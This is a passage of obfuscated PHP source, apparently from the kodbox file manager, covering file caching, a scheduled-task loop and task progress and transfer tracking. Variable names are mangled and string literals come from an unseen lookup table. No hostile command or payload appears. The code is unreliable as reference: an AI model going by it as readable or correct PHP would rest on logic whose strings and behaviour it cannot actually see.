$œÕº”™Ë = self::init()->remove($‘¿ÔĞ¯); CacheLock::unlock($­ªóÁéí); return $œÕº”™Ë; } public static function removeMemory($øÈŒúé) { $—ÓŸÂ“… = self::key($øÈŒúé); unset(self::$memoryCache[$—ÓŸÂ“…]); } public static function clearMemory($ĞŒŒòŞ„ = false) { if ($ĞŒŒòŞ„) { $ĞŒŒòŞ„ = self::key($ĞŒŒòŞ„); unset(self::$memoryCache[$ĞŒŒòŞ„]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ùèÅ´Ãš][916])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ùèÅ´Ãš][917])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($œ·©¢éœ, $Œ¶ó³èÍ) { $ìÍĞ­‰ =& $_SERVER[ùèÅ´Ãš]; $this->cachePath = $œ·©¢éœ[$ìÍĞ­‰[87]]; $this->prefix = $ìÍĞ­‰[918]; $this->cacheTime = $Œ¶ó³èÍ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($«Á“ÔŸ) { $Ğ×œó˜õ =& $_SERVER[ùèÅ´Ãš]; $«Á“ÔŸ = str_replace(array($Ğ×œó˜õ[919], $Ğ×œó˜õ[100], $Ğ×œó˜õ[76]), $Ğ×œó˜õ[920], $«Á“ÔŸ); return $this->cachePath . $Ğ×œó˜õ[921] . $«Á“ÔŸ . $Ğ×œó˜õ[922]; } public function set($ÏõÛÙñ¿, $œÚÑŒÇ , $­şúñĞ = false) { $­şúñĞ = $­şúñĞ ? $­şúñĞ : $this->cacheTime; $Ï†ÚÓëó = $this->getFile($ÏõÛÙñ¿); if (file_put_contents($Ï†ÚÓëó, $this->prefix . $œÚÑŒÇ , LOCK_EX)) { @touch($Ï†ÚÓëó, intval(time() + $­şúñĞ)); clearstatcache(); return !0; } @unlink($Ï†ÚÓëó); return !1; } public function get($ô–ŞÛÜ’) { $ğ­˜€å = $this->getFile($ô–ŞÛÜ’); if (file_exists($ğ­˜€å) && filemtime($ğ­˜€å) < time()) { @unlink($ğ­˜€å); return !1; } $šÙÌâé = @file_get_contents($ğ­˜€å); return substr($šÙÌâé, strlen($this->prefix)); } public function remove($ı››Ëå…) { $ı¢¶™Œã = $this->getFile($ı››Ëå…); return @unlink($ı¢¶™Œã); } public function deleteAll() { $«È–¡úØ =& $_SERVER[ùèÅ´Ãš]; $å¨˜ƒ·  = scandir($this->cachePath); foreach ($å¨˜ƒ·  as $ÅãÚ…–) { $¿ì¬¼Õ = $this->cachePath . $ÅãÚ…–; if (strpos($¿ì¬¼Õ, $«È–¡úØ[922]) && strpos($¿ì¬¼Õ, $«È–¡úØ[923])) { @unlink($¿ì¬¼Õ); } } } public function clearTimeout() { $æÕ›à =& $_SERVER[ùèÅ´Ãš]; $ä¸êãëô = scandir($this->cachePath); foreach ($ä¸êãëô as $îÃœ°çè) { $±ı‚‡‚³ = $this->cachePath . $îÃœ°çè; if (strpos($±ı‚‡‚³, $æÕ›à[922]) && strpos($±ı‚‡‚³, $æÕ›à[923]) && filemtime($±ı‚‡‚³) < time()) { @unlink($±ı‚‡‚³); } } } } goto AŒ„¾¤Ş×İ; f“¢ñ¢•¡ä: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ºÔ²«Á =& $_SERVER[ùèÅ´Ãš]; if (self::valueGet($ºÔ²«Á[827]) != $ºÔ²«Á[91]) { return; } if (self::valueGet($ºÔ²«Á[1746]) == $ºÔ²«Á[91]) { $ÈÂ“Ö§€ = self::valueGet($ºÔ²«Á[1747]); if (time() - $ÈÂ“Ö§€ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ºÔ²«Á[1746], $ºÔ²«Á[91]); self::log($ºÔ²«Á[1748] . ACTION . $ºÔ²«Á[1749]); Hook::bind($ºÔ²«Á[1750], $ºÔ²«Á[1751]); $ƒ”¤ÄÍÚ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ºÔ²«Á[827]) != $ºÔ²«Á[91]) { self::valueSet($ºÔ²«Á[1746], $ºÔ²«Á[231]); self::log($ºÔ²«Á[1752]); die; } $·Å¸é³ = time(); if ($·Å¸é³ - $ƒ”¤ÄÍÚ >= 60) { self::valueSet(array($ºÔ²«Á[1746] => $ºÔ²«Á[91], $ºÔ²«Á[1747] => $·Å¸é³)); $ƒ”¤ÄÍÚ = $·Å¸é³; } if (!file_exists(USER_SYSTEM . $ºÔ²«Á[1753])) { self::valueSet(array($ºÔ²«Á[1746] => $ºÔ²«Á[231], $ºÔ²«Á[827] => $ºÔ²«Á[231])); self::log($ºÔ²«Á[1754]); die; } $ØÈì±ç = file_get_contents(BASIC_PATH . $ºÔ²«Á[1755]); $ö¿€±š— = KOD_VERSION . $ºÔ²«Á[10] . KOD_VERSION_BUILD; $Ù­ÃŞıà = match_text($ØÈì±ç, $ºÔ²«Á[1756]) . $ºÔ²«Á[10] . match_text($ØÈì±ç, $ºÔ²«Á[1757]); if ($Ù­ÃŞıà != $ö¿€±š—) { self::restart(); self::log("\163\x74\x6f\160\145\144\x2e\133\166\x65\x72\163\x69\x6f\156\x20\165\x70\x64\x61\164\145\73{$versionNow}\x20\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $œú–˜“ =& $_SERVER[ùèÅ´Ãš]; http_close(); $GLOBALS[$œú–˜“[1758]] = 1; $_SERVER[$œú–˜“[1759]] = $œú–˜“[1760]; $_COOKIE = array(); $GLOBALS[$œú–˜“[1761]] = 1; $GLOBALS[$œú–˜“[1762]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $•Ì±•´Œ =& $_SERVER[ùèÅ´Ãš]; http_close(); self::valueSet($•Ì±•´Œ[827], $•Ì±•´Œ[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($•Ì±•´Œ[1746] => $•Ì±•´Œ[231], $•Ì±•´Œ[827] => $•Ì±•´Œ[91])); self::log($•Ì±•´Œ[1763]); } public static function taskSwitch() { $Şòè¿ƒ— =& $_SERVER[ùèÅ´Ãš]; $´éÁØÓ« = self::valueGet($Şòè¿ƒ—[827]) == $Şòè¿ƒ—[91] ? $Şòè¿ƒ—[231] : $Şòè¿ƒ—[91]; self::valueSet($Şòè¿ƒ—[827], $´éÁØÓ«); } public static function shutdownEvent() { $Òä±•¯û =& $_SERVER[ùèÅ´Ãš]; self::valueSet($Òä±•¯û[1746], $Òä±•¯û[231]); self::log($Òä±•¯û[1764]); } public static function config($êÚõÊ·¦, $®òÜ†ÑÑ) { self::valueSet($_SERVER[ùèÅ´Ãš][827], $êÚõÊ·¦); } private static function taskRunAll() { $òğç˜§œ =& $_SERVER[ùèÅ´Ãš]; $Ó·åİä = timeFloat(); $òòÖÒ„• = Model($òğç˜§œ[1765])->listData(); $î“®ëŸß = count($òòÖÒ„•); for ($À¯ÓØà‘ = 0; $À¯ÓØà‘ < $î“®ëŸß; $À¯ÓØà‘++) { $»şÍ–†© = $òòÖÒ„•[$À¯ÓØà‘]; if (!$»şÍ–†©[$òğç˜§œ[477]] || $»şÍ–†©[$òğç˜§œ[1766]] != $òğç˜§œ[91]) { continue; } if (!self::taskTimeCheck($»şÍ–†©)) { continue; } self::taskRun($»şÍ–†©); } Hook::trigger($òğç˜§œ[1767]); self::taskQueueRun($Ó·åİä); } private static function taskQueueRun($×ú÷ØÅ) { $Œ Å‡Ê = 10; while (!0) { $»ªéğï = TaskQueue::run(); if ($»ªéğï === !1) { break; } if (timeFloat() - $×ú÷ØÅ >= $Œ Å‡Ê) { break; } } } private static function taskTimeCheck($Ò¡ İÕÜ) { $”Ğ†ªÚ =& $_SERVER[ùèÅ´Ãš]; $ãæ“õÔ = json_decode($Ò¡ İÕÜ[$”Ğ†ªÚ[207]], !0); $ñø¹ĞùÁ = intval($Ò¡ İÕÜ[$”Ğ†ªÚ[1747]]); $ÖÂ×Ëäí = strtotime($”Ğ†ªÚ[1768] . $ãæ“õÔ[$”Ğ†ªÚ[1769]] . $”Ğ†ªÚ[1770]) - strtotime($”Ğ†ªÚ[1771]); $‡†İ¥óŞ = time() - strtotime(date($”Ğ†ªÚ[1772]) . $”Ğ†ªÚ[1773]); $£æúÂŸ® = $‡†İ¥óŞ >= $ÖÂ×Ëäí && $‡†İ¥óŞ <= $ÖÂ×Ëäí + 3600; switch ($ãæ“õÔ[$”Ğ†ªÚ[33]]) { case $”Ğ†ªÚ[1774]: if (time() - $ñø¹ĞùÁ < 3600 * 24 * 30) { return !1; } if ($ãæ“õÔ[$”Ğ†ªÚ[1774]] == date($”Ğ†ªÚ[1775]) && $£æúÂŸ®) { return !0; } break; case $”Ğ†ªÚ[1776]: if (time() - $ñø¹ĞùÁ < 3600 * 24 * 7) { return !1; } $ŠòÄå = date($”Ğ†ªÚ[1777]) == 0 ? 7 : date($”Ğ†ªÚ[1777]); if ($ãæ“õÔ[$”Ğ†ªÚ[1776]] == $ŠòÄå && $£æúÂŸ®) { return !0; } break; case $”Ğ†ªÚ[1769]: if (time() - $ñø¹ĞùÁ < 3600 * 24) { return !1; } if ($£æúÂŸ®) { return !0; } break; case $”Ğ†ªÚ[1778]: if (time() - $ñø¹ĞùÁ >= floatval($ãæ“õÔ[$”Ğ†ªÚ[1778]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÀıÅéÒø =& $_SERVER[ùèÅ´Ãš]; static $‡ü¹¼Ö = 0; $‹ëâ‰ = 300; if (!$‡ü¹¼Ö) { $‡ü¹¼Ö = time(); } if (time() - $‡ü¹¼Ö < $‹ëâ‰) { return; } $‡ü¹¼Ö = time(); $ŒÔ‚¨óÆ = Model($ÀıÅéÒø[581])->db($ÀıÅéÒø[12]); if ($ŒÔ‚¨óÆ) { $ŒÔ‚¨óÆ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÀıÅéÒø[1779], $ÀıÅéÒø[1780]); die; } } public static function taskRun($Íº·¶«) { $Å…Ã¦ =& $_SERVER[ùèÅ´Ãš]; self::log($Å…Ã¦[1781] . $Íº·¶«[$Å…Ã¦[477]] . $Å…Ã¦[1782] . $Íº·¶«[$Å…Ã¦[32]] . $Å…Ã¦[1783] . $Íº·¶«[$Å…Ã¦[1784]]); Model($Å…Ã¦[1765])->run($Íº·¶«[$Å…Ã¦[477]]); $ÛğĞÍ×¾ = timeFloat(); $ğ®°ÜıÚ = $Å…Ã¦[12]; switch ($Íº·¶«[$Å…Ã¦[33]]) { case $Å…Ã¦[384]: $êı¥Û× = url_request($Íº·¶«[$Å…Ã¦[1784]], $Å…Ã¦[1517], !1, !1, !1, !1, 10); if ($êı¥Û×[$Å…Ã¦[827]]) { $ğ®°ÜıÚ = strlen($êı¥Û×[$Å…Ã¦[1301]]); } break; case $Å…Ã¦[1785]: $ğ®°ÜıÚ = Hook::apply($Íº·¶«[$Å…Ã¦[1784]]); default: break; } Model($Å…Ã¦[1786])->add(array($Å…Ã¦[1787] => $Å…Ã¦[12], $Å…Ã¦[1788] => $Å…Ã¦[231], $Å…Ã¦[33] => $Å…Ã¦[1789] . $Íº·¶«[$Å…Ã¦[477]], $Å…Ã¦[1790] => json_encode(array($Å…Ã¦[32] => $Íº·¶«[$Å…Ã¦[32]], $Å…Ã¦[1791] => timeFloat() - $ÛğĞÍ×¾, $Å…Ã¦[833] => $ğ®°ÜıÚ)))); $øÙ”Ëš¼ = $ğ®°ÜıÚ ? $Å…Ã¦[1792] . $ğ®°ÜıÚ : $Å…Ã¦[12]; self::log($Å…Ã¦[1793] . $Íº·¶«[$Å…Ã¦[477]] . $Å…Ã¦[178] . $øÙ”Ëš¼); return !0; } public static function valueGet($ü™Âàäß) { $ÎÀıĞá« =& $_SERVER[ùèÅ´Ãš]; $©«™îÂĞ = $ÎÀıĞá«[1794]; $´Š°ÙĞ‰ = Model($ÎÀıĞá«[510])->get($ü™Âàäß, $©«™îÂĞ); if (is_null($´Š°ÙĞ‰)) { Model($ÎÀıĞá«[510])->set($ÎÀıĞá«[827], $ÎÀıĞá«[91], $©«™îÂĞ); Model($ÎÀıĞá«[510])->set($ÎÀıĞá«[1746], $ÎÀıĞá«[231], $©«™îÂĞ); $´Š°ÙĞ‰ = Model($ÎÀıĞá«[510])->get($ü™Âàäß, $©«™îÂĞ); } return $´Š°ÙĞ‰; } private static function valueSet($®®¥§Î­, $©òÌÕÑ« = false) { $ã¿Ä€† =& $_SERVER[ùèÅ´Ãš]; $Íøóç• = $ã¿Ä€†[1795]; CacheLock::lock($Íøóç•); $Ùâ—Û®æ = Model($ã¿Ä€†[510])->set($®®¥§Î­, $©òÌÕÑ«, $ã¿Ä€†[1794]); CacheLock::unlock($Íøóç•); return $Ùâ—Û®æ; } protected static function log($êî±Ñö) { write_log($êî±Ñö, $_SERVER[ùèÅ´Ãš][1780]); } private static function cacheClear() { $ğ¡ë”ÉŒ =& $_SERVER[ùèÅ´Ãš]; Cache::clearMemory(Model($ğ¡ë”ÉŒ[510])->cacheKey($ğ¡ë”ÉŒ[1794])); Cache::clearMemory(Model($ğ¡ë”ÉŒ[510])->cacheKey($ğ¡ë”ÉŒ[1796])); Model($ğ¡ë”ÉŒ[1765])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ùß»©‰€, $äÓôìò£ = '', $šÆ¦ˆ÷¿ = 0, $Ÿ³ˆÆƒ› = '') { $è‘’ó­ =& $_SERVER[ùèÅ´Ãš]; if (self::get($ùß»©‰€)) { return; } $this->task = array($è‘’ó­[477] => $ùß»©‰€, $è‘’ó­[1797] => USER_ID, $è‘’ó­[1683] => $Ÿ³ˆÆƒ›, $è‘’ó­[528] => $è‘’ó­[12], $è‘’ó­[33] => $äÓôìò£, $è‘’ó­[1153] => $è‘’ó­[12], $è‘’ó­[1151] => $šÆ¦ˆ÷¿, $è‘’ó­[1798] => 0, $è‘’ó­[1799] => 0, $è‘’ó­[1800] => 0, $è‘’ó­[1801] => timeFloat(), $è‘’ó­[1802] => 0, $è‘’ó­[1803] => 0, $è‘’ó­[1804] => 0, $è‘’ó­[1805] => 0, $è‘’ó­[827] => $è‘’ó­[1746]); $GLOBALS[$è‘’ó­[1806]] = 1; Hook::bind($è‘’ó­[1750], array($this, $è‘’ó­[1807])); Hook::bind($è‘’ó­[1808], array($this, $è‘’ó­[1809])); $this->startAfter(); Hook::trigger($è‘’ó­[1810], $this->task); $this->task[$è‘’ó­[1803]] = timeFloat(); } public function end($îìÉ¼ó = '') { $¢îÊÆÖÛ =& $_SERVER[ùèÅ´Ãš]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¢îÊÆÖÛ[1803]]) { self::valueSet($this->task[$¢îÊÆÖÛ[477]], !1); } $this->isEnd = !0; if ($îìÉ¼ó) { $this->task[$¢îÊÆÖÛ[528]] = $îìÉ¼ó; } self::log($¢îÊÆÖÛ[1811] . $this->task[$¢îÊÆÖÛ[477]] . $¢îÊÆÖÛ[1812] . sprintf($¢îÊÆÖÛ[935], timeFloat() - $this->task[$¢îÊÆÖÛ[1801]]) . $¢îÊÆÖÛ[1813]); Hook::unbind($¢îÊÆÖÛ[1750], array($this, $¢îÊÆÖÛ[1807])); Hook::unbind($¢îÊÆÖÛ[1808], array($this, $¢îÊÆÖÛ[1809])); $this->endAfter(); $‡Ï‹Ôâã = $this->task; $this->task = !1; Hook::trigger($¢îÊÆÖÛ[1814], $‡Ï‹Ôâã); } public function update($ÃŠàöÅ = 0, $­ØŒÌÑ½ = false) { $üÎ¿ƒĞê =& $_SERVER[ùèÅ´Ãš]; $”¤íÊ±ã =& $this->task; if (!$”¤íÊ±ã) { return; } $”¤íÊ±ã[$üÎ¿ƒĞê[1798]] += $ÃŠàöÅ; $”¤íÊ±ã[$üÎ¿ƒĞê[1802]] = timeFloat(); if ($”¤íÊ±ã[$üÎ¿ƒĞê[1151]]) { if ($”¤íÊ±ã[$üÎ¿ƒĞê[1151]] < $”¤íÊ±ã[$üÎ¿ƒĞê[1798]]) { $”¤íÊ±ã[$üÎ¿ƒĞê[1151]] = $”¤íÊ±ã[$üÎ¿ƒĞê[1798]]; } $º¼àÆü± = timeFloat() - $”¤íÊ±ã[$üÎ¿ƒĞê[1801]] - $”¤íÊ±ã[$üÎ¿ƒĞê[1804]]; if ($º¼àÆü± <= 0) { $º¼àÆü± = 0.001; } $”¤íÊ±ã[$üÎ¿ƒĞê[1799]] = $”¤íÊ±ã[$üÎ¿ƒĞê[1798]] / $”¤íÊ±ã[$üÎ¿ƒĞê[1151]]; $”¤íÊ±ã[$üÎ¿ƒĞê[1800]] = $”¤íÊ±ã[$üÎ¿ƒĞê[1798]] / $º¼àÆü±; if ($”¤íÊ±ã[$üÎ¿ƒĞê[1799]] > 0) { $”¤íÊ±ã[$üÎ¿ƒĞê[1805]] = $º¼àÆü± * (1 - $”¤íÊ±ã[$üÎ¿ƒĞê[1799]]) / $”¤íÊ±ã[$üÎ¿ƒĞê[1799]]; } $”¤íÊ±ã[$üÎ¿ƒĞê[1805]] = $”¤íÊ±ã[$üÎ¿ƒĞê[1805]] <= 0 ? 0 : $”¤íÊ±ã[$üÎ¿ƒĞê[1805]]; } $this->updateAfter(); $¨›˜ƒä‹ = 0.2; if (timeFloat() - $”¤íÊ±ã[$üÎ¿ƒĞê[1803]] < $¨›˜ƒä‹ && !$­ØŒÌÑ½) { return; } $æ˜ÓÁ™µ = self::get($”¤íÊ±ã[$üÎ¿ƒĞê[477]]); $¢Ê¢Ù¦Ï = $æ˜ÓÁ™µ[$üÎ¿ƒĞê[827]]; if ($¢Ê¢Ù¦Ï == self::STATYS_KILL) { $¸¹Õµ±¿ = array($üÎ¿ƒĞê[1815] => LNG($üÎ¿ƒĞê[1816]), $üÎ¿ƒĞê[1311] => !1); Cache::set($üÎ¿ƒĞê[1817] . $this->task[$üÎ¿ƒĞê[477]], $¸¹Õµ±¿, 30); $this->onKill(); $this->end(); die; } else { if ($¢Ê¢Ù¦Ï == self::STATYS_STOP) { $âÉÙ›¯Ó = 2; $æ˜ÓÁ™µ[$üÎ¿ƒĞê[1804]] += $âÉÙ›¯Ó; self::valueSet($”¤íÊ±ã[$üÎ¿ƒĞê[477]], $æ˜ÓÁ™µ); sleep($âÉÙ›¯Ó); $this->update(); return; } } $”¤íÊ±ã[$üÎ¿ƒĞê[827]] = $¢Ê¢Ù¦Ï ? $¢Ê¢Ù¦Ï : $”¤íÊ±ã[$üÎ¿ƒĞê[827]]; $”¤íÊ±ã[$üÎ¿ƒĞê[1804]] = $æ˜ÓÁ™µ[$üÎ¿ƒĞê[1804]] ? $æ˜ÓÁ™µ[$üÎ¿ƒĞê[1804]] : 0; $”¤íÊ±ã[$üÎ¿ƒĞê[1803]] = timeFloat(); Hook::trigger($üÎ¿ƒĞê[1818], $”¤íÊ±ã); self::valueSet($”¤íÊ±ã[$üÎ¿ƒĞê[477]], $”¤íÊ±ã); } public function onKillSet($¤ååîú, $îØÇ¸˜ç = array()) { $this->onKillCall = array($¤ååîú, $îØÇ¸˜ç); } public function onKill() { $ÆÖ´îŒ =& $_SERVER[ùèÅ´Ãš]; self::log($ÆÖ´îŒ[1811] . $this->task[$ÆÖ´îŒ[477]] . $ÆÖ´îŒ[1819]); Hook::trigger($ÆÖ´îŒ[1820], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ãš¨ŞúÖ) { $Á›Ş·ñÒ =& $_SERVER[ùèÅ´Ãš]; Cache::set($Á›Ş·ñÒ[1817] . $this->task[$Á›Ş·ñÒ[477]], $Ãš¨ŞúÖ, 60); if (!is_array($Ãš¨ŞúÖ) || !$Ãš¨ŞúÖ[$Á›Ş·ñÒ[1311]]) { self::log($Á›Ş·ñÒ[1821] . json_encode($Ãš¨ŞúÖ)); } return $Ãš¨ŞúÖ; } public static function get($ııÊ„»Â) { $÷ßµùê¨ =& $_SERVER[ùèÅ´Ãš]; $ç×Ú·Ğ¤ = self::valueGet($ııÊ„»Â); if (is_array($ç×Ú·Ğ¤) && $ç×Ú·Ğ¤[$÷ßµùê¨[1822]]) { $©üÀ…Ğà = ActionApply($ç×Ú·Ğ¤[$÷ßµùê¨[1822]], array($ç×Ú·Ğ¤)); $ç×Ú·Ğ¤ = is_array($©üÀ…Ğà) ? $©üÀ…Ğà : $ç×Ú·Ğ¤; } return $ç×Ú·Ğ¤; } public static function listData() { $ãˆ±¿§¶ = self::valueGet(); return array_sort_by($ãˆ±¿§¶, $_SERVER[ùèÅ´Ãš][1801], !0); } public static function kill($¿¶áè“) { return self::changeStatus($¿¶áè“, self::STATYS_KILL); } public static function stop($Ãé¯àÆ¯) { return self::changeStatus($Ãé¯àÆ¯, self::STATYS_STOP); } public static function restart($ÓÁÚ˜ôô) { return self::changeStatus($ÓÁÚ˜ôô, self::STATYS_RUNNING); } public static function killAll() { $£æ‚¾ç¶ =& $_SERVER[ùèÅ´Ãš]; $Ã¾ù”¸¦ = self::listData(); foreach ($Ã¾ù”¸¦ as $õŞñìã) { self::kill($õŞñìã[$£æ‚¾ç¶[477]]); } sleep(2); foreach ($Ã¾ù”¸¦ as $õŞñìã) { self::valueSet($õŞñìã[$£æ‚¾ç¶[477]], !1); } } private static function changeStatus($ÔØª”Ó, $ƒ¸Ä°¤) { $²ÜÇ²˜ß =& $_SERVER[ùèÅ´Ãš]; $Ìö‘Æìä = self::valueGet($ÔØª”Ó); if (!$Ìö‘Æìä) { return !1; } $Ìö‘Æìä[$²ÜÇ²˜ß[827]] = $ƒ¸Ä°¤; self::valueSet($ÔØª”Ó, $Ìö‘Æìä); self::log($²ÜÇ²˜ß[1823] . $Ìö‘Æìä[$²ÜÇ²˜ß[477]] . $²ÜÇ²˜ß[1824] . $ƒ¸Ä°¤); return !0; } public static function valueGet($òÓ‚’ú = false) { $üçòéÜ± =& $_SERVER[ùèÅ´Ãš]; if ($òÓ‚’ú) { $ÈõçÈ˜ = Model($üçòéÜ±[522])->where(array($üçòéÜ±[97] => $òÓ‚’ú, $üçòéÜ±[33] => $üçòéÜ±[1160]))->find(); return $ÈõçÈ˜ ? json_decode($ÈõçÈ˜[$üçòéÜ±[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ñ€®¦§ = false) { $’óâáë’ =& $_SERVER[ùèÅ´Ãš]; $³â³Ğ˜ = array($’óâáë’[33] => $’óâáë’[1160]); if ($ñ€®¦§) { $³â³Ğ˜[$’óâáë’[1797]] = $ñ€®¦§; } $– ±ïÆö = Model($’óâáë’[522])->where($³â³Ğ˜)->select(); $– ±ïÆö = $– ±ïÆö ? $– ±ïÆö : array(); foreach ($– ±ïÆö as $‹ä× => $ı¶¢•ß¼) { $– ±ïÆö[$‹ä×] = json_decode($ı¶¢•ß¼[$’óâáë’[452]], !0); } return $– ±ïÆö; } public static function valueSet($âÆİÏà½, $ñÙÉäºÂ) { $ËÉÛ©»Õ =& $_SERVER[ùèÅ´Ãš]; if (!$ñÙÉäºÂ) { return Model($ËÉÛ©»Õ[522])->where(array($ËÉÛ©»Õ[97] => $âÆİÏà½, $ËÉÛ©»Õ[33] => $ËÉÛ©»Õ[1160]))->delete(); } $¥íÈÆõÏ = json_encode($ñÙÉäºÂ); if (!$¥íÈÆõÏ) { ob_start(); var_dump($ñÙÉäºÂ); $´‰Î´êå = ob_get_clean(); self::log($ËÉÛ©»Õ[1825] . json_encode_force($´‰Î´êå)); } if (!$âÆİÏà½ || !$ñÙÉäºÂ[$ËÉÛ©»Õ[477]]) { return !1; } $€ã¦â˜— = array($ËÉÛ©»Õ[33] => $ËÉÛ©»Õ[1160], $ËÉÛ©»Õ[1797] => USER_ID, $ËÉÛ©»Õ[97] => $âÆİÏà½, $ËÉÛ©»Õ[452] => $¥íÈÆõÏ); $×Çİ­­ = $ËÉÛ©»Õ[1826]; CacheLock::lock($×Çİ­­); Model($ËÉÛ©»Õ[522])->add($€ã¦â˜—, array(), !0); CacheLock::unlock($×Çİ­­); } public static function log($¬ãÃÊî) { if (!GLOBAL_DEBUG) { return; } write_log($¬ãÃÊî, $_SERVER[ùèÅ´Ãš][1827]); } } class TaskFileTransfer extends Task { protected function startAfter() { $êâü—èı =& $_SERVER[ùèÅ´Ãš]; $°«âÆ¼’ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($êâü—èı[1828], array($this, $êâü—èı[1829])); Hook::bind($êâü—èı[1322], array($this, $êâü—èı[1830])); Hook::bind($êâü—èı[1831], array($this, $êâü—èı[1832])); Hook::bind($êâü—èı[675], array($this, $êâü—èı[1833])); Hook::bind($êâü—èı[676], array($this, $êâü—èı[1834])); Hook::bind($êâü—èı[682], array($this, $êâü—èı[1835])); Hook::bind($êâü—èı[683], array($this, $êâü—èı[1836])); Hook::bind($êâü—èı[678], array($this, $êâü—èı[1837])); Hook::bind($êâü—èı[680], array($this, $êâü—èı[1838])); Hook::bind($êâü—èı[644], array($this, $êâü—èı[1839])); Hook::bind($êâü—èı[641], array($this, $êâü—èı[1839])); Hook::bind($êâü—èı[646], array($this, $êâü—èı[1839])); Hook::bind($êâü—èı[648], array($this, $êâü—èı[1839])); Hook::bind($êâü—èı[650], array($this, $êâü—èı[1839])); Hook::bind($êâü—èı[1840], array($this, $êâü—èı[1841])); Hook::bind($êâü—èı[666], array($this, $êâü—èı[1842])); $this->sourceModelCopyFlag = !1; Hook::bind($êâü—èı[1843], array($this, $êâü—èı[1844])); Hook::bind($êâü—èı[1845], array($this, $êâü—èı[1846])); Hook::bind($êâü—èı[1847], array($this, $êâü—èı[1848])); $°«âÆ¼’[$êâü—èı[1849]] = LNG($êâü—èı[1850]); $°«âÆ¼’[$êâü—èı[1851]] = 0; $°«âÆ¼’[$êâü—èı[1852]] = 0; $°«âÆ¼’[$êâü—èı[1153]] = $êâü—èı[12]; $°«âÆ¼’[$êâü—èı[1853]] = $êâü—èı[12]; $°«âÆ¼’[$êâü—èı[1854]] = 0; $°«âÆ¼’[$êâü—èı[1855]] = 0; $°«âÆ¼’[$êâü—èı[1856]] = 0; if (!$°«âÆ¼’[$êâü—èı[1683]]) { $°«âÆ¼’[$êâü—èı[1683]] = LNG($êâü—èı[1857]); } } protected function endAfter() { $¨›öƒé— =& $_SERVER[ùèÅ´Ãš]; Hook::unbind($¨›öƒé—[1828], array($this, $¨›öƒé—[1829])); Hook::unbind($¨›öƒé—[1322], array($this, $¨›öƒé—[1830])); Hook::unbind($¨›öƒé—[1831], array($this, $¨›öƒé—[1832])); Hook::unbind($¨›öƒé—[675], array($this, $¨›öƒé—[1833])); Hook::unbind($¨›öƒé—[676], array($this, $¨›öƒé—[1834])); Hook::unbind($¨›öƒé—[682], array($this, $¨›öƒé—[1835])); Hook::unbind($¨›öƒé—[683], array($this, $¨›öƒé—[1836])); Hook::unbind($¨›öƒé—[678], array($this, $¨›öƒé—[1837])); Hook::unbind($¨›öƒé—[680], array($this, $¨›öƒé—[1838])); Hook::unbind($¨›öƒé—[644], array($this, $¨›öƒé—[1839])); Hook::unbind($¨›öƒé—[641], array($this, $¨›öƒé—[1839])); Hook::unbind($¨›öƒé—[646], array($this, $¨›öƒé—[1839])); Hook::unbind($¨›öƒé—[648], array($this, $¨›öƒé—[1839])); Hook::unbind($¨›öƒé—[650], array($this, $¨›öƒé—[1839])); Hook::unbind($¨›öƒé—[1840], array($this, $¨›öƒé—[1841])); Hook::unbind($¨›öƒé—[666], array($this, $¨›öƒé—[1842])); Hook::unbind($¨›öƒé—[1843], array($this, $¨›öƒé—[1844])); Hook::unbind($¨›öƒé—[1845], array($this, $¨›öƒé—[1846])); Hook::unbind($¨›öƒé—[1847], array($this, $¨›öƒé—[1848])); } public function copyMoveStart($¾–ˆÖşÌ, $¡ìíÕÔ±, $Ò×ÉçŸ‡, $Úªß›àœ) { $œŠüÆ£ =& $_SERVER[ùèÅ´Ãš]; self::log($œŠüÆ£[1858] . $¡ìíÕÔ± . $œŠüÆ£[73] . $Úªß›àœ); $ó‰ÑìÄ± = rtrim(TEMP_FILES, $œŠüÆ£[8]); if (substr($¡ìíÕÔ±, 0, strlen($ó‰ÑìÄ±)) == $ó‰ÑìÄ±) { return; } if (substr($Úªß›àœ, 0, strlen($ó‰ÑìÄ±)) == $ó‰ÑìÄ±) { return; } $Å¸üúˆÄ =& $this->task; $Å¸üúˆÄ[$œŠüÆ£[1859]] = KodIO::transferType($¾–ˆÖşÌ, $Ò×ÉçŸ‡); $this->update(); } public function updateAfter() { $à©öÖÏò =& $_SERVER[ùèÅ´Ãš]; $§è’¹Ÿê =& $this->task; if (!$§è’¹Ÿê[$à©öÖÏò[841]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($§è’¹Ÿê[$à©öÖÏò[1859]] == $à©öÖÏò[1423]) { return; } self::updateTask($§è’¹Ÿê); } private static function updateTask(&$Ô†Íİæ) { $¸ôÍßä½ =& $_SERVER[ùèÅ´Ãš]; if ($Ô†Íİæ[$¸ôÍßä½[1859]] == $¸ôÍßä½[1293] || $Ô†Íİæ[$¸ôÍßä½[1859]] == $¸ôÍßä½[110]) { if ($Ô†Íİæ[$¸ôÍßä½[1853]]) { 